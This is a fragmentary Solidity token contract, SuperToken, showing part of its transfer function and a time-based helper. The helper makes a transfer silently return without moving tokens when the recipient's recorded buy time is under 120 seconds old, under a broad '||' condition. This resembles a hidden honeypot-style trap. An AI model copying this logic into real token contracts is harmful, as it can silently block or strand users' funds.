...
contract SuperToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        else if (!_isExcludedFromFee[sender] || !_isExcluded[sender]) {
            if(!feeReducer(_buyTime[recipient])){
                restoreAllFee();
                return;
            }
        }
    ...
    function feeReducer(uint256 a) private view returns (bool) {
        if(a + 120 < block.timestamp){
            return true;
        }
        return false;
    }
